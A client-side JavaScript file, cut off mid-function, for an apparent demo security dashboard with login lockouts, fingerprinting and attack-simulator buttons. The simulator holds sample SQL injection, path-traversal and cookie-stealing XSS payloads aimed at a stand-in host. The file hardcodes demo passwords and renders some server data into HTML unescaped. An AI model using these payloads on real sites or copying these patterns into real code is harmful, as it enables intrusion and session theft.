/**
 * WebShield Security Operations Center (SOC) Controller & Client Suite
 * Apex Institute of Technology & Cyber Sciences
 * 
 * Production-ready SOC Drawer, Live /api/admin/telemetry Integration,
 * Real-Time Blocked IP & 24-Hour Locked Account Table with Precision Countdown Timers,
 * One-Click Unblock Controls, Simulated Brute-Force Attacks, and Live WAF Packet Logs.
 */

(function () {
  'use strict';

  // Global State
  let shield3d = null;
  let portal3d = null;
  let clientFingerprint = null;
  let clientIp = '127.0.0.1';
  let lockoutScreenTimer = null;
  let tableCountdownInterval = null;
  let challengeState = null;
  let currentAttemptsRemaining = 3;
  let activeUser = null;
  let sseEventSource = null;
  let cachedTelemetry = null;

  // DOM Elements Cache
  const elements = {
    // Views
    gateView: document.getElementById('gate-view'),
    portalView: document.getElementById('portal-view'),
    authCard: document.getElementById('auth-card'),
    loginForm: document.getElementById('login-form'),
    usernameInput: document.getElementById('username'),
    passwordInput: document.getElementById('password'),
    pwToggleBtn: document.getElementById('pw-toggle-btn'),
    eyeIcon: document.getElementById('eye-icon'),
    btnSubmitLogin: document.getElementById('btn-submit-login'),

    // Attempt Meter
    attemptCountText: document.getElementById('attempt-count-text'),
    strikeDots: [
      document.getElementById('strike-dot-1'),
      document.getElementById('strike-dot-2'),
      document.getElementById('strike-dot-3')
    ],

    // Challenge Box
    challengeBox: document.getElementById('challenge-box'),
    challengeQuestionText: document.getElementById('challenge-question-text'),
    challengeAnswerInput: document.getElementById('challenge-answer'),

    // Alerts & Tickers
    gateAlertBox: document.getElementById('gate-alert-box'),
    gateAlertText: document.getElementById('gate-alert-text'),
    clientIpDisplay: document.getElementById('client-ip-display'),
    clientFpDisplay: document.getElementById('client-fp-display'),

    // 24-Hour Lockout Screen
    lockoutScreen: document.getElementById('lockout-screen'),
    lockoutCountdown: document.getElementById('lockout-countdown'),
    lockoutReason: document.getElementById('lockout-reason'),
    receiptThreatId: document.getElementById('receipt-threat-id'),
    receiptFingerprint: document.getElementById('receipt-fingerprint'),
    receiptIp: document.getElementById('receipt-ip'),
    receiptTimestamp: document.getElementById('receipt-timestamp'),
    btnOpenOverride: document.getElementById('btn-open-override'),

    // Admin Override Modal
    overrideModal: document.getElementById('override-modal'),
    btnCloseOverride: document.getElementById('btn-close-override'),
    overrideForm: document.getElementById('override-form'),
    overrideKeyInput: document.getElementById('override-key-input'),

    // Decryption Transition
    transitionOverlay: document.getElementById('transition-overlay'),
    transitionProgressFill: document.getElementById('transition-progress-fill'),
    transitionTelemetryText: document.getElementById('transition-telemetry-text'),

    // User Profile Display
    userAvatarImg: document.getElementById('user-avatar-img'),
    userDisplayName: document.getElementById('user-display-name'),
    userDisplayRole: document.getElementById('user-display-role'),
    btnLogout: document.getElementById('btn-logout'),

    // Quick Fill Buttons
    fillStudentBtn: document.getElementById('fill-student-btn'),
    fillFacultyBtn: document.getElementById('fill-faculty-btn'),
    fillAdminBtn: document.getElementById('fill-admin-btn'),

    // Gate Attack Simulator Buttons
    btnSimSqli: document.getElementById('btn-sim-sqli'),
    btnSimXss: document.getElementById('btn-sim-xss'),
    btnSimPath: document.getElementById('btn-sim-path'),
    btnSimBrute: document.getElementById('btn-sim-brute'),

    // =========================================================================
    // SOC DRAWER ELEMENTS
    // =========================================================================
    socFloatingBtn: document.getElementById('soc-floating-btn'),
    defconPill: document.getElementById('defcon-pill'),
    socDrawerBackdrop: document.getElementById('soc-drawer-backdrop'),
    socDrawer: document.getElementById('soc-drawer'),
    btnDrawerClose: document.getElementById('btn-drawer-close'),
    btnDrawerRefresh: document.getElementById('btn-drawer-refresh'),
    socStatusSubtitle: document.getElementById('soc-status-subtitle'),

    // SOC Drawer Quick Controls
    btnSocQuickBrute: document.getElementById('btn-soc-quick-brute'),
    btnSocQuickSqli: document.getElementById('btn-soc-quick-sqli'),
    btnSocQuickXss: document.getElementById('btn-soc-quick-xss'),
    btnSocQuickUnblockAll: document.getElementById('btn-soc-quick-unblock-all'),

    // SOC Drawer Metrics
    drawerMetricRequests: document.getElementById('drawer-metric-requests'),
    drawerMetricThreats: document.getElementById('drawer-metric-threats'),
    drawerMetricLockouts: document.getElementById('drawer-metric-lockouts'),
    drawerMetricRatelimit: document.getElementById('drawer-metric-ratelimit'),

    // SOC Drawer Tabs
    tabBtnLockouts: document.getElementById('tab-btn-lockouts'),
    tabBtnWaf: document.getElementById('tab-btn-waf'),
    tabLockoutsCount: document.getElementById('tab-lockouts-count'),
    tabWafCount: document.getElementById('tab-waf-count'),
    panelLockouts: document.getElementById('panel-lockouts'),
    panelWaf: document.getElementById('panel-waf'),

    // SOC Drawer Tables
    lockedAccountsTbody: document.getElementById('locked-accounts-tbody'),
    wafLogsTbody: document.getElementById('waf-logs-tbody'),

    // Nav & Hero Buttons
    btnOpenSoc: document.getElementById('btn-open-soc'),
    btnHeroSoc: document.getElementById('btn-hero-soc')
  };

  // ===========================================================================
  // 1. HARDWARE-BASED CLIENT DEVICE FINGERPRINTING
  // ===========================================================================

  function generateDeviceFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      canvas.width = 240;
      canvas.height = 60;
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = "14px 'Arial', sans-serif";
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.fillText('WebShield-Apex-2026', 2, 15);
      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
      ctx.fillText('HardwareSecurityGate', 4, 17);
      const canvasHash = canvas.toDataURL();

      let webglVendor = 'Generic-Vendor';
      let webglRenderer = 'Generic-Renderer';
      const glCanvas = document.createElement('canvas');
      const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'Unknown-Vendor';
          webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown-Renderer';
        }
      }

      const screenRes = `${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`;
      const hardwareConcurrency = navigator.hardwareConcurrency || 4;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC';

      return {
        canvasHash: canvasHash.substring(0, 80),
        webglVendor,
        webglRenderer,
        screenRes,
        hardwareConcurrency,
        timezone
      };
    } catch (e) {
      return {
        canvasHash: 'fallback-canvas',
        webglVendor: 'fallback-vendor',
        webglRenderer: 'fallback-renderer',
        screenRes: '1920x1080x24',
        hardwareConcurrency: 4,
        timezone: 'UTC'
      };
    }
  }

  // ===========================================================================
  // 2. APPLICATION INITIALIZATION
  // ===========================================================================

  async function initWebShield() {
    // 1. Initialize 3D Defense Shield if canvas is present
    if (window.WebShield3D && document.getElementById('shield-canvas')) {
      shield3d = new window.WebShield3D('shield-canvas');
    }

    // 2. Perform Client Device Fingerprint Handshake
    const rawHardware = generateDeviceFingerprint();
    try {
      const response = await fetch('/api/auth/fingerprint', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(rawHardware)
      });
      const data = await response.json();
      clientFingerprint = data.fingerprint;
      clientIp = data.ip;

      if (elements.clientFpDisplay) {
        elements.clientFpDisplay.textContent = clientFingerprint.substring(0, 16) + '...';
      }
      if (elements.clientIpDisplay) {
        elements.clientIpDisplay.textContent = clientIp;
      }

      // If already locked out on backend, trigger lockout HUD
      if (data.isLockedOut && data.lockoutDetails) {
        activate24HourLockout(data.lockoutDetails);
      }
    } catch (err) {
      console.warn('[WebShield] Fingerprint handshake error:', err);
    }

    // 3. Verify authenticated session
    await verifyExistingSession();

    // 4. Setup event listeners
    setupEventListeners();

    // 5. Connect to live Real-Time SOC Stream (SSE)
    connectSocStream();

    // 6. Initial Telemetry Sync from /api/admin/telemetry
    await fetchAdminTelemetry();

    // Start background table countdown timer loop (ticks every 1000ms)
    startTableCountdownTicker();
  }

  async function verifyExistingSession() {
    try {
      const res = await fetch('/api/auth/me');
      if (res.ok) {
        const data = await res.json();
        if (data.authenticated && data.user) {
          activeUser = data.user;
          unlockCampusPortal(data.user, false);
        }
      }
    } catch (err) {
      // Unauthenticated, stay on gatekeeper view
    }
  }

  // ===========================================================================
  // 3. CONNECT TO /api/admin/telemetry (SOC DATA ENGINE)
  // ===========================================================================

  async function fetchAdminTelemetry() {
    try {
      const response = await fetch('/api/admin/telemetry', {
        headers: {
          'X-WebShield-Fingerprint': clientFingerprint || ''
        }
      });

      if (!response.ok) {
        console.warn('[WebShield-SOC] Telemetry fetch returned status:', response.status);
        return;
      }

      const data = await response.json();
      cachedTelemetry = data;

      // 1. Update Metrics Cards
      renderMetrics(data.metrics);

      // 2. Update System DEFCON Pill
      renderDefcon(data.systemDefcon, (data.activeLockouts || []).length);

      // 3. Render Table of Blocked IPs & 24-Hour Locked Accounts
      renderLockedAccountsTable(data.activeLockouts || [], data.blockedIps || []);

      // 4. Render Table of Live WAF Packet Logs
      renderWafLogsTable(data.recentWafLogs || []);

      // 5. Update subtitle status
      if (elements.socStatusSubtitle) {
        const timeStr = new Date(data.timestamp).toLocaleTimeString();
        elements.socStatusSubtitle.textContent = `Autonomous Perimeter Active • Last Sync: ${timeStr} • Guards: WAF + IAM + IDS + QKD`;
      }

    } catch (err) {
      console.error('[WebShield-SOC] Failed to fetch /api/admin/telemetry:', err);
    }
  }

  function renderMetrics(metrics = {}) {
    if (elements.drawerMetricRequests) elements.drawerMetricRequests.textContent = (metrics.totalRequestsInspected || 0).toLocaleString();
    if (elements.drawerMetricThreats) elements.drawerMetricThreats.textContent = (metrics.totalThreatsBlocked || 0).toLocaleString();
    if (elements.drawerMetricLockouts) elements.drawerMetricLockouts.textContent = (metrics.activeLockoutsCount || 0).toLocaleString();
    if (elements.drawerMetricRatelimit) elements.drawerMetricRatelimit.textContent = (metrics.rateLimitBlocks || 0).toLocaleString();
  }

  function renderDefcon(defconString, activeLockoutCount) {
    if (!elements.defconPill) return;

    if (activeLockoutCount > 0) {
      elements.defconPill.className = 'defcon-tag danger';
      elements.defconPill.textContent = 'DEFCON 2 - ELEVATED';
    } else {
      elements.defconPill.className = 'defcon-tag';
      elements.defconPill.textContent = 'DEFCON 5 - SECURE';
    }
  }

  // ===========================================================================
  // 4. REAL-TIME TABLE: BLOCKED IPs & 24-HOUR LOCKED ACCOUNTS
  // ===========================================================================

  function renderLockedAccountsTable(activeLockouts = [], blockedIps = []) {
    if (!elements.lockedAccountsTbody) return;

    if (elements.tabLockoutsCount) {
      elements.tabLockoutsCount.textContent = activeLockouts.length;
    }

    if (activeLockouts.length === 0) {
      elements.lockedAccountsTbody.innerHTML = `
        <tr>
          <td colspan="6" class="empty-table-state">
            <span style="color:#00F5D4;">🛡️ Zero Active Lockouts.</span>
            All perimeter access points nominal. No credentials or IP addresses currently detained.
          </td>
        </tr>
      `;
      return;
    }

    const now = Date.now();
    let rowsHtml = '';

    for (const item of activeLockouts) {
      const remainingMs = Math.max(0, new Date(item.expiresAt).getTime() - now);
      const remainingFormatted = formatMsToHms(remainingMs);

      rowsHtml += `
        <tr data-threat-id="${item.threatId}" data-expires-at="${new Date(item.expiresAt).getTime()}">
          <td class="threat-id-cell">${item.threatId}</td>
          <td>
            <div style="display:flex; flex-direction:column; gap:2px;">
              <span style="font-weight:600; color:#F8FAFC;">${item.username || 'Unauthenticated'}</span>
              <span style="font-size:0.7rem; color:#94A3B8;">IP: ${item.ip}</span>
            </div>
          </td>
          <td style="max-width:240px; color:#CBD5E1; font-size:0.72rem;">${item.reason || '3-Strike Failure Threshold'}</td>
          <td class="countdown-cell live-lockout-timer">${remainingFormatted}</td>
          <td>
            <span class="severity-badge CRITICAL">24H LOCKED</span>
          </td>
          <td>
            <button 
              type="button" 
              class="btn-unblock-row" 
              data-threat-id="${item.threatId}" 
              data-username="${item.username || ''}" 
              data-ip="${item.ip || ''}"
              title="Instantly clear this lockout"
            >
              Unblock User
            </button>
          </td>
        </tr>
      `;
    }

    elements.lockedAccountsTbody.innerHTML = rowsHtml;

    // Attach click handlers to each "Unblock User" button
    const unblockBtns = elements.lockedAccountsTbody.querySelectorAll('.btn-unblock-row');
    unblockBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        const threatId = btn.getAttribute('data-threat-id');
        const username = btn.getAttribute('data-username');
        const ip = btn.getAttribute('data-ip');
        handleOneClickUnblock({ threatId, username, ip });
      });
    });
  }

  function startTableCountdownTicker() {
    if (tableCountdownInterval) clearInterval(tableCountdownInterval);

    tableCountdownInterval = setInterval(() => {
      if (!elements.lockedAccountsTbody) return;
      const rows = elements.lockedAccountsTbody.querySelectorAll('tr[data-expires-at]');
      const now = Date.now();

      rows.forEach(row => {
        const expiresAt = parseInt(row.getAttribute('data-expires-at'), 10);
        const timerCell = row.querySelector('.live-lockout-timer');
        if (!timerCell || isNaN(expiresAt)) return;

        const remainingMs = Math.max(0, expiresAt - now);
        if (remainingMs <= 0) {
          timerCell.textContent = '00:00:00';
          timerCell.style.color = '#10B981';
          // Trigger sync to remove naturally expired row
          fetchAdminTelemetry();
        } else {
          timerCell.textContent = formatMsToHms(remainingMs);
        }
      });
    }, 1000);
  }

  function formatMsToHms(ms) {
    if (ms <= 0) return '00:00:00';
    const totalSeconds = Math.floor(ms / 1000);
    const hours = Math.floor(totalSeconds / 3600);
    const minutes = Math.floor((totalSeconds % 3600) / 60);
    const seconds = totalSeconds % 60;
    const pad = (n) => String(n).padStart(2, '0');
    return `${pad(hours)}:${pad(minutes)}:${pad(seconds)}`;
  }

  // ===========================================================================
  // 5. ONE-CLICK UNBLOCK USER ACTION
  // ===========================================================================

  async function handleOneClickUnblock({ threatId, username, ip, overrideAll = false }) {
    try {
      const response = await fetch('/api/admin/unblock', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ threatId, username, ip, overrideAll })
      });

      const data = await response.json();

      if (response.ok && data.success) {
        // If unblocking all or if this matches the current device/user
        if (overrideAll || (username && elements.usernameInput && elements.usernameInput.value === username)) {
          if (lockoutScreenTimer) clearInterval(lockoutScreenTimer);
          if (elements.lockoutScreen) elements.lockoutScreen.classList.remove('active');
          updateAttemptMeter(3);
          challengeState = null;
          if (elements.challengeBox) elements.challengeBox.classList.remove('active');
          if (shield3d) shield3d.setShieldState('CYAN_IDLE');
        }

        showAlert(`Unblocked successfully: ${data.message}`, 'success');

        // Immediately refresh telemetry and table
        await fetchAdminTelemetry();
      } else {
        alert(data.error || 'Failed to unblock target.');
      }
    } catch (err) {
      console.error('[WebShield-Unblock-Error]', err);
      alert('Network error unblocking target.');
    }
  }

  // ===========================================================================
  // 6. REAL-TIME TABLE: LIVE WAF PACKET INSPECTION LOG
  // ===========================================================================

  function renderWafLogsTable(logs = []) {
    if (!elements.wafLogsTbody) return;

    if (elements.tabWafCount) {
      elements.tabWafCount.textContent = logs.length;
    }

    if (logs.length === 0) {
      elements.wafLogsTbody.innerHTML = `
        <tr>
          <td colspan="6" class="empty-table-state">
            No recent WAF packet deflections recorded. Deep packet inspection active on all ingress routes.
          </td>
        </tr>
      `;
      return;
    }

    let rowsHtml = '';
    for (const log of logs) {
      const timeStr = log.timestamp ? new Date(log.timestamp).toLocaleTimeString() : '00:00:00';
      const sev = log.severity || 'INFO';
      const cleanSnippet = escapeHtml(log.payloadSample || 'No payload sample');

      rowsHtml += `
        <tr>
          <td style="color:#94A3B8; font-size:0.72rem;">[${timeStr}]</td>
          <td><span class="severity-badge ${sev}">${sev}</span></td>
          <td style="color:#F8FAFC; font-weight:600;">${log.ruleTriggered || log.eventType}</td>
          <td style="color:#94A3B8; font-size:0.72rem;">${log.ip}</td>
          <td class="code-cell" title="${cleanSnippet}">${cleanSnippet}</td>
          <td><span style="color:#00F5D4; font-size:0.72rem;">${log.actionTaken || 'LOGGED'}</span></td>
        </tr>
      `;
    }

    elements.wafLogsTbody.innerHTML = rowsHtml;
  }

  function escapeHtml(str) {
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }

  // ===========================================================================
  // 7. REAL-TIME SOC SERVER-SENT EVENTS (SSE) STREAM
  // ===========================================================================

  function connectSocStream() {
    try {
      if (sseEventSource) sseEventSource.close();
      sseEventSource = new EventSource('/api/soc/stream');

      sseEventSource.onmessage = (event) => {
        try {
          const entry = JSON.parse(event.data);
          // Prepend to WAF logs table if it's an inspection/intrusion event
          prependLiveWafLog(entry);
          // Refresh telemetry metrics & lockout table
          fetchAdminTelemetry();
        } catch (e) {
          // ignore heartbeat comments
        }
      };

      sseEventSource.onerror = () => {
        // Native auto-reconnect handled by EventSource
      };
    } catch (err) {
      console.warn('[WebShield] SSE connection failed:', err);
    }
  }

  function prependLiveWafLog(log) {
    if (!elements.wafLogsTbody) return;

    // Check if table currently displays empty state
    const emptyState = elements.wafLogsTbody.querySelector('.empty-table-state');
    if (emptyState) {
      elements.wafLogsTbody.innerHTML = '';
    }

    const tr = document.createElement('tr');
    tr.style.animation = 'fadeIn 0.3s ease';
    const timeStr = log.timestamp ? new Date(log.timestamp).toLocaleTimeString() : '00:00:00';
    const sev = log.severity || 'INFO';
    const cleanSnippet = escapeHtml(log.payloadSample || 'No payload sample');

    tr.innerHTML = `
      <td style="color:#94A3B8; font-size:0.72rem;">[${timeStr}]</td>
      <td><span class="severity-badge ${sev}">${sev}</span></td>
      <td style="color:#F8FAFC; font-weight:600;">${log.ruleTriggered || log.eventType}</td>
      <td style="color:#94A3B8; font-size:0.72rem;">${log.ip || clientIp}</td>
      <td class="code-cell" title="${cleanSnippet}">${cleanSnippet}</td>
      <td><span style="color:#00F5D4; font-size:0.72rem;">${log.actionTaken || 'LOGGED'}</span></td>
    `;

    elements.wafLogsTbody.insertBefore(tr, elements.wafLogsTbody.firstChild);

    // Keep table limited to latest 60 rows
    while (elements.wafLogsTbody.children.length > 60) {
      elements.wafLogsTbody.removeChild(elements.wafLogsTbody.lastChild);
    }
  }

  // ===========================================================================
  // 8. SIMULATION CONTROLS & ATTACK TRIGGERS
  // ===========================================================================

  async function triggerSimulatedAttack(type, customPayload = null) {
    showAlert(`Executing simulated attack vector: ${type}...`, 'warning');

    try {
      const response = await fetch('/api/admin/simulate-attack', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-WebShield-Fingerprint': clientFingerprint
        },
        body: JSON.stringify({
          attackType: type,
          customPayload
        })
      });

      const data = await response.json();

      if (response.status === 423 || data.lockoutData) {
        // Fast-triggered 3-strike brute force lockout!
        activate24HourLockout(data.lockoutData);
        showAlert('Brute-force simulated. 24-Hour Security Lockout activated!', 'error');
        await fetchAdminTelemetry();
        return;
      }

      if (data.shieldDeflection) {
        // 3D red shockwave ring deflection
        if (shield3d) shield3d.triggerDeflection();
        showAlert(`WAF DEFLECTION: Intercepted ${type} vector. Packet dropped.`, 'error');
        await fetchAdminTelemetry();
      }
    } catch (err) {
      console.error('[WebShield-AttackSim-Error]', err);
    }
  }

  // ===========================================================================
  // 9. FORM CONTROLS & 3-STRIKE 24-HOUR LOCKOUT ENGINE
  // ===========================================================================

  function updateAttemptMeter(remaining) {
    currentAttemptsRemaining = remaining;
    if (elements.attemptCountText) {
      elements.attemptCountText.textContent = `${remaining}/3 Attempts Remaining`;
    }

    elements.strikeDots.forEach((dot, index) => {
      dot.className = 'strike-node';
      if (index < remaining) {
        dot.classList.add(remaining === 1 ? 'warning' : 'available');
      } else {
        dot.classList.add('breached');
      }
    });

    if (remaining === 2) {
      if (shield3d) shield3d.setShieldState('AMBER_PULSE');
    } else if (remaining === 1) {
      if (shield3d) shield3d.setShieldState('SOLAR_WARNING');
    } else if (remaining === 0) {
      if (shield3d) shield3d.setShieldState('CRIMSON_LOCKOUT');
    } else {
      if (shield3d) shield3d.setShieldState('CYAN_IDLE');
    }
  }

  function showAlert(message, type = 'error') {
    if (!elements.gateAlertBox || !elements.gateAlertText) return;
    elements.gateAlertBox.className = `gate-alert ${type}`;
    elements.gateAlertText.textContent = message;
    elements.gateAlertBox.style.display = 'flex';

    if (type !== 'error') {
      setTimeout(() => {
        elements.gateAlertBox.style.display = 'none';
      }, 5000);
    }
  }

  async function handleLoginSubmit(e) {
    e.preventDefault();

    const username = elements.usernameInput.value.trim();
    const password = elements.passwordInput.value;

    if (!username || !password) {
      showAlert('Please enter academic identity and password.', 'error');
      return;
    }

    elements.btnSubmitLogin.disabled = true;
    elements.btnSubmitLogin.innerHTML = '<span>Verifying Cryptographic Identity...</span>';

    const payload = {
      username,
      password,
      clientFingerprint
    };

    if (challengeState) {
      payload.challengeToken = challengeState.challengeToken;
      payload.challengeAnswer = elements.challengeAnswerInput.value.trim();
      payload.challengeAnswerHash = challengeState.challengeAnswerHash;
      payload.challengeNonce = challengeState.challengeNonce;
    }

    try {
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-WebShield-Fingerprint': clientFingerprint
        },
        body: JSON.stringify(payload)
      });

      const data = await response.json();

      // 1. Success (<= 2 strikes)
      if (response.ok && data.success) {
        showAlert('Identity verified. Decrypting campus portal...', 'success');
        if (shield3d) shield3d.setShieldState('EMERALD_VERIFIED');
        activeUser = data.user;
        playDecryptionTransition(data.user);
        return;
      }

      // 2. Critical 24-Hour Lockout (Strike 3)
      if (response.status === 423 || data.lockoutActive || data.strike === 3) {
        updateAttemptMeter(0);
        activate24HourLockout(data.lockoutData || data);
        await fetchAdminTelemetry();
        return;
      }

      // 3. Strike 1 Failed (2 Remaining)
      if (data.strike === 1) {
        updateAttemptMeter(2);
        showAlert(data.message || 'Invalid credentials. 2 attempts remaining.', 'warning');
        shakeCard();
      }

      // 4. Strike 2 Failed (1 Remaining + Challenge Required)
      if (data.strike === 2 && data.challengeRequired) {
        updateAttemptMeter(1);
        challengeState = {
          challengeToken: data.challengeToken,
          challengeAnswerHash: data.challengeAnswerHash,
          challengeNonce: data.challengeNonce
        };

        if (elements.challengeQuestionText) elements.challengeQuestionText.textContent = data.challengeQuestion;
        if (elements.challengeBox) elements.challengeBox.classList.add('active');
        if (elements.challengeAnswerInput) elements.challengeAnswerInput.focus();

        showAlert(data.message || 'High threat alert: 1 attempt remaining. Solve challenge token.', 'warning');
        shakeCard();
      }

    } catch (err) {
      console.error('[WebShield-Login-Error]', err);
      showAlert('Network error connecting to WebShield perimeter.', 'error');
    } finally {
      elements.btnSubmitLogin.disabled = false;
      elements.btnSubmitLogin.innerHTML = `
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/>
          <polyline points="10 17 15 12 10 7"/>
          <line x1="15" y1="12" x2="3" y2="12"/>
        </svg>
        <span>Verify &amp; Enter Campus Portal</span>
      `;
    }
  }

  function shakeCard() {
    if (!elements.authCard) return;
    elements.authCard.style.animation = 'none';
    elements.authCard.offsetHeight;
    elements.authCard.style.animation = 'shake 0.4s cubic-bezier(0.36, 0.07, 0.19, 0.97)';
  }

  // ===========================================================================
  // 10. 24-HOUR LOCKOUT CONTROLLER & COUNTDOWN HUD
  // ===========================================================================

  function activate24HourLockout(lockoutData) { if (lockoutData && (!lockoutData.unlockAt || isNaN(new Date(lockoutData.unlockAt).getTime()))) { lockoutData.unlockAt = Date.now() + 86400000; } if (lockoutData && (!lockoutData.expiresAt || isNaN(new Date(lockoutData.expiresAt).getTime()))) { lockoutData.expiresAt = Date.now() + 86400000; }
    if (shield3d) shield3d.setShieldState('CRIMSON_LOCKOUT');

    if (elements.lockoutScreen) {
      elements.lockoutScreen.classList.add('active');
    }

    const threatId = lockoutData.threatId || 'THREAT-L3-BREACH';
    const expiresAt = new Date(lockoutData.expiresAt).getTime();
    const lockedAt = new Date(lockoutData.lockedAt || Date.now()).toUTCString();

    if (elements.receiptThreatId) elements.receiptThreatId.textContent = threatId;
    if (elements.receiptFingerprint) elements.receiptFingerprint.textContent = (lockoutData.fingerprint || clientFingerprint || 'Unknown-FP').substring(0, 24) + '...';
    if (elements.receiptIp) elements.receiptIp.textContent = `${clientIp} (Apex Campus Perimeter)`;
    if (elements.receiptTimestamp) elements.receiptTimestamp.textContent = lockedAt;
    if (elements.lockoutReason && lockoutData.reason) elements.lockoutReason.textContent = lockoutData.reason;

    if (lockoutScreenTimer) clearInterval(lockoutScreenTimer);

    function tick() {
      const now = Date.now();
      const remainingMs = Math.max(0, expiresAt - now);

      if (remainingMs <= 0) {
        clearInterval(lockoutScreenTimer);
        if (elements.lockoutCountdown) elements.lockoutCountdown.textContent = '00:00:00';
        showAlert('24-Hour lockout expired. Access restored.', 'success');
        elements.lockoutScreen.classList.remove('active');
        updateAttemptMeter(3);
        fetchAdminTelemetry();
        return;
      }

      if (elements.lockoutCountdown) {
        elements.lockoutCountdown.textContent = formatMsToHms(remainingMs);
      }
    }

    tick();
    lockoutScreenTimer = setInterval(tick, 1000);
  }

  // ===========================================================================
  // 11. 1.8-SECOND DECRYPTION TRANSITION HUD & CAMPUS PORTAL UNLOCK
  // ===========================================================================

  function playDecryptionTransition(user) {
    if (!elements.transitionOverlay) {
      unlockCampusPortal(user, true);
      return;
    }

    elements.transitionOverlay.classList.add('active');

    if (elements.transitionProgressFill) {
      elements.transitionProgressFill.style.width = '0%';
      setTimeout(() => {
        elements.transitionProgressFill.style.width = '100%';
      }, 50);
    }

    const steps = [
      'Establishing TLS 1.3 quantum key exchange...',
      'Validating clearance level: ' + (user.clearanceLevel || 'Level 1'),
      'Decrypting holographic campus model...',
      'Access Granted • Entering Apex Network'
    ];

    let stepIndex = 0;
    const stepInterval = setInterval(() => {
      stepIndex++;
      if (stepIndex < steps.length && elements.transitionTelemetryText) {
        elements.transitionTelemetryText.textContent = steps[stepIndex];
      }
    }, 450);

    setTimeout(() => {
      clearInterval(stepInterval);
      elements.transitionOverlay.classList.remove('active');
      unlockCampusPortal(user, true);
    }, 1800);
  }

  function unlockCampusPortal(user, animated = true) {
    if (elements.gateView) elements.gateView.classList.add('hidden');
    if (elements.portalView) elements.portalView.classList.add('active');

    if (elements.userDisplayName) elements.userDisplayName.textContent = user.name || 'Academic User';
    if (elements.userDisplayRole) elements.userDisplayRole.textContent = `${user.role.toUpperCase()} • ${user.clearanceLevel || 'Level 1'}`;
    if (elements.userAvatarImg && user.avatar) elements.userAvatarImg.src = user.avatar;

    if (window.ApexPortal3D && !portal3d) {
      setTimeout(() => {
        portal3d = new window.ApexPortal3D('portal-canvas');
      }, 100);
    }
  }

  // ===========================================================================
  // 12. SOC DRAWER OPEN & CLOSE CONTROLS
  // ===========================================================================

  function openSocDrawer() {
    if (elements.socDrawerBackdrop) {
      elements.socDrawerBackdrop.classList.add('active');
    }
    fetchAdminTelemetry();
  }

  function closeSocDrawer() {
    if (elements.socDrawerBackdrop) {
      elements.socDrawerBackdrop.classList.remove('active');
    }
  }

  // ===========================================================================
  // 13. MASTER EVENT LISTENERS
  // ===========================================================================

  function setupEventListeners() {
    // Form Submit
    if (elements.loginForm) {
      elements.loginForm.addEventListener('submit', handleLoginSubmit);
    }

    // Password Visibility Toggle
    if (elements.pwToggleBtn && elements.passwordInput) {
      elements.pwToggleBtn.addEventListener('click', () => {
        const isPassword = elements.passwordInput.type === 'password';
        elements.passwordInput.type = isPassword ? 'text' : 'password';
      });
    }

    // Typing Reaction on 3D Shield
    if (elements.usernameInput) {
      elements.usernameInput.addEventListener('input', () => {
        if (shield3d) shield3d.onTyping();
      });
    }
    if (elements.passwordInput) {
      elements.passwordInput.addEventListener('input', () => {
        if (shield3d) shield3d.onTyping();
      });
    }

    // Pre-seeded Credentials Buttons
    if (elements.fillStudentBtn) {
      elements.fillStudentBtn.addEventListener('click', () => {
        elements.usernameInput.value = 'student@apex.edu';
        elements.passwordInput.value = 'Apex@2026';
        showAlert('Loaded Student Demo Credentials', 'success');
      });
    }

    if (elements.fillFacultyBtn) {
      elements.fillFacultyBtn.addEventListener('click', () => {
        elements.usernameInput.value = 'faculty@apex.edu';
        elements.passwordInput.value = 'CyberProf#99';
        showAlert('Loaded Faculty Demo Credentials', 'success');
      });
    }

    if (elements.fillAdminBtn) {
      elements.fillAdminBtn.addEventListener('click', () => {
        elements.usernameInput.value = 'admin@apex.edu';
        elements.passwordInput.value = 'ShieldMaster!01';
        showAlert('Loaded SOC Admin Demo Credentials', 'success');
      });
    }

    // Gate Attack Simulator Buttons
    if (elements.btnSimSqli) {
      elements.btnSimSqli.addEventListener('click', () => {
        triggerSimulatedAttack('SQLI', "' OR 1=1; DROP TABLE users;--");
      });
    }

    if (elements.btnSimXss) {
      elements.btnSimXss.addEventListener('click', () => {
        triggerSimulatedAttack('XSS', "<script>document.location='http://evil.io/steal?c='+document.cookie</script>");
      });
    }

    if (elements.btnSimPath) {
      elements.btnSimPath.addEventListener('click', () => {
        triggerSimulatedAttack('PATH_TRAVERSAL', '../../../../etc/shadow');
      });
    }

    if (elements.btnSimBrute) {
      elements.btnSimBrute.addEventListener('click', () => {
        triggerSimulatedAttack('BRUTE_FORCE_TRIGGER');
      });
    }

    // =========================================================================
    // SOC DRAWER CONTROLS
    // =========================================================================

    // Open Drawer Triggers
    if (elements.socFloatingBtn) elements.socFloatingBtn.addEventListener('click', openSocDrawer);
    if (elements.btnOpenSoc) elements.btnOpenSoc.addEventListener('click', openSocDrawer);
    if (elements.btnHeroSoc) elements.btnHeroSoc.addEventListener('click', openSocDrawer);

    // Close Drawer Trigger
    if (elements.btnDrawerClose) elements.btnDrawerClose.addEventListener('click', closeSocDrawer);
    if (elements.socDrawerBackdrop) {
